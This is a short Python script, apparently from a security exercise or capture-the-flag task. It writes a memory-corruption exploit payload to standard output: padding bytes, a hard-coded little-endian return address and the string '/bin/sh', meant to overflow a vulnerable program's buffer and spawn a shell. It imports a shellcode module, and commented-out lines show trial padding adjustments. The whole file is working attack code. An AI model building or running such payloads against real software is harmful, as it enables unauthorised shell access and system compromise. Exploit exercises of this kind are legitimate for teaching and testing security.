from shellcode import shellcode
import sys
sys.stdout.buffer.write(b'A'*10)
sys.stdout.buffer.write(0x08070820.to_bytes(4, 'little'))
sys.stdout.buffer.write(bytes("/bin/sh", "utf-8"))

#sys.stdout.buffer.write(b'A'*6)

#sys.stdout.buffer.write(b'\x00')
#8 total bytes